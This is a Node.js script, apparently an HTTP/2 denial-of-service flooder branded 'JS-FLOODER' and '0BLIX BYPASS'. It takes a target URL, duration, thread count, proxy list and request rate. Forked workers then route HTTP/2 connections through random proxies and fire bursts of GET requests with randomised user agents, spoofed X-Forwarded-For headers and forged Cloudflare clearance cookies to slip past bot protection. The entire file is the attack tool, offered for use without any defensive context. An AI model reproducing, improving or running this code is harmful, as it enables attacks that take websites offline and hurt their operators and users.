const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const net = require('net');
const crypto = require('crypto');
const cluster = require('cluster');
const url = require('url');
const fs = require('fs');

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];

let input = process.argv[7];
let interval;
if (input === 'flood') {
  console.log('flood');
  interval = 500;
} else if (input === 'bypass') {
  console.log('wait bypass');
  interval = 5000;
} else {
  console.log('underfined');
  process.exit(1);
}

// Validate input
if (!target || !time || !thread || !proxyFile || !rps) {
  console.log('JS-FLOODER'.bgRed);
  console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate bypass/flood`.rainbow);
  process.exit(1);
}

// Validate target format
if (!/^https?:\/\//i.test(target)) {
  console.error('sent with http:// or https://');
  process.exit(1);
}

// Parse proxy list
let proxys = [];
try {
  const proxyData = fs.readFileSync(proxyFile, 'utf-8');
  proxys = proxyData.match(/\S+/g);
} catch (err) {
  console.error('Error proxy file:', err.message);
  process.exit(1);
}

// Validate RPS value
if (isNaN(rps) || rps <= 0) {
  console.error('number rps');
  process.exit(1);
}

const proxyr = () => {
  for (let i = proxys.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [proxys[i], proxys[j]] = [proxys[j], proxys[i]];
  }
  return proxys[Math.floor(Math.random() * proxys.length)];
};

if (cluster.isMaster) {
  const currentDate = new Date();
  console.clear();
  console.log(`0BLIX BYPASS`.red);
  console.log(`TARGET :`.rainbow + process.argv[2].gray);
  console.log(`TIME:`.rainbow + process.argv[3].gray);
  console.log(`RATE:`.rainbow + process.argv[6].gray);
  console.log(`THREAD:`.rainbow + process.argv[4].gray);

  for (let _ of Array.from({ length: thread })) {
    cluster.fork();
  }
  setTimeout(() => process.exit(-1), time * 1000);
} else {
  setInterval(flood);
}

function flood() {
  const parsed = new URL(target);
  const proxy = proxyr().split(':');
  const randIp = require('random-ip')();
  const randomString = crypto.randomBytes(20).toString('hex');
  const secretKey = crypto.randomBytes(32);
  const ciphe = crypto.createCipheriv('aes-256-cbc', secretKey, crypto.randomBytes(16));
  let encrypted = ciphe.update(randomString, 'utf8', 'hex');
  encrypted += ciphe.final('hex');
  const cookieValue = encrypted;
  const bytes = crypto.randomBytes(16);
  const xAuthToken = bytes.toString('hex');
  const osVersions = {
    'Windows': ['6.0', '6.1', '6.2', '6.3', '10.0'],
    'Android': ['4.4.2', '4.4.4', '5.0', '5.1', '6.0', '6.1', '7.0', '7.1', '8.0', '8.1', '9', '10', '15'],
    'iOS': ['8_1', '8_3', '8_4', '9_0', '9_1', '9_2', '9_3', '10_0', '10_1', '10_2', '10_3', '11_0', '11_1', '11_2', '11_3', '11_4', '12_0', '12_1', '12_2', '12_3', '12_4', '13_0', '13_1', '13_2', '13_3', '13_4', '14_0', '14_1', '14_2', '14_3', '14_4'],
  };
  const chromeVersions = ['141.0.7390.108', '141.0.7390.123', '138.0.7204.251', '80.0.3987.149', '81.0.4044.138', '83.0.4103.97', '85.0.4183.102', '87.0.4280.88', '88.0.4324.150', '89.0.4389.82', '90.0.4430.93', '91.0.4472.124', '92.0.4515.107', '93.0.4577.63'];
  const safariVersions = ['534.30', '537.36', '538.1', '602.1', '604.1', '605.1.15', '606.1.36', '607.1.39', '618.1.25', '619.1.30', '620.1.35', '621.1.40'];
  const androidVersions = ['15.0', '11.0', '10.0', '9.0', '8.0', '7.0', '6.0', '5.1', '5.0', '4.4', '4.3', '4.2', '4.1', '4.0'];
  const iosVersions = ['15.0', '14.8', '14.7', '14.6', '14.5', '14.4', '14.3', '14.2', '14.1', '14.0', '13.7', '13.6', '13.5', '13.4', '13.3', '13.2', '13.1', '13.0', '12.4', '12.3', '12.2', '12.1', '12.0', '11.4', '11.3', '11.2', '11.1', '11.0', '10.3', '10.2', '10.1', '10.0', '9.3', '9.2', '9.1', '9.0', '8.4', '8.3', '8.2', '8.1', '8.0'];
  const devices = ['iPhone', 'SM-G991B', 'iPhone14,3', 'Pixel 6', 'Mi 11 Lite', 'iPad', 'iPod', 'Android', 'Samsung', 'Huawei', 'Redmi', 'HTC', 'Nokia', 'Sony', 'LG', 'Motorola', 'Google'];
  const osNames = Object.keys(osVersions);
  const osName = osNames[Math.floor(Math.random() * osNames.length)];
  const osVersion = osVersions[osName][Math.floor(Math.random() * osVersions[osName].length)];
  const device = devices[Math.floor(Math.random() * devices.length)];
  const isMobile = device !== 'PC';
  const browserName = isMobile ? 'Mobile Safari' : 'Chrome';
  const browserVersion = browserName === 'Chrome' ? chromeVersions[Math.floor(Math.random() * chromeVersions.length)] : safariVersions[Math.floor(Math.random() * safariVersions.length)];
  const userAgent = `${isMobile ? 'Mozilla/5.0' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'} ${isMobile ? `(Linux; Android ${androidVersions[Math.floor(Math.random() * androidVersions.length)]}; ${device})` : ''} ${isMobile && osName === 'iOS' ? `AppleWebKit/${browserVersion} (KHTML, like Gecko)` : `AppleWebKit/${browserVersion} (KHTML, like Gecko) ${osName}/${osVersion}`} ${browserName}/${browserVersion} ${isMobile && osName === 'iOS' ? `Mobile/${iosVersions[Math.floor(Math.random() * iosVersions.length)]}` : ''}`;
  const uas = userAgent;

  var header = {
    ':authority': parsed.host,
    ':method': 'GET',
    ":path": parsed.path,
    ":scheme": "https",
    'Cache-Control': 'no-cache',
    'Accept-Encoding': 'gzip, deflate, br',
    'X-Forwarded-For': proxy[0],
    'sec-ch-ua': '"Chromium";v="141", "Google Chrome";v="141", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': 'Windows',
    'User-Agent': uas,
    'upgrade-insecure-requests': '1',
    'sec-fetch-site': 'none',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': `cf_clearance=${randomString}-${randIp}-0-1-${randIp}.${randIp}.${randIp}-${randIp}.2.${randIp}`,
    'CF-IPCountry': 'US',
    'Referer': 'https://www.google.com/',
    'If-Modified-Since': 'Wed, 21 Jan 2020 07:23:06 GMT',
    "x-requested-with": "XMLHttpRequest",
    'content-type': 'application/json',
  };

  var agent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 400000,
    maxSockets: 70000,
    maxTotalSockets: 12000,
  });

  var client = http2.connect(parsed.href, {
    createConnection: () => {
      const socket = net.connect({
        host: proxy[0],
        port: proxy[1],
      });
      const tlsSocket = tls.connect({
        host: parsed.host,
        port: 443,
        servername: parsed.host,
        socket: socket,
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
        ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
      }, (err) => {
        if (err) {
          console.error(err);
        }
      });
      tlsSocket.setKeepAlive(true, 60 * 10000);
      return tlsSocket;
    },
    settings: {
      headerTableSize: 65536,
      maxConcurrentStreams: 1000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false,
    },
  });

  client.on("connect", () => {
    setInterval(() => {
      for (let i = 0; i < rps; i++) {
        const request = client.request(header)
          .on("response", response => {
            request.close();
            request.destroy();
            return;
          });
        request.end();
      }
    }, interval);
  });

  client.on("close", () => {
    client.destroy();
  });

  client.on("error", error => {
    client.destroy();
  });
}
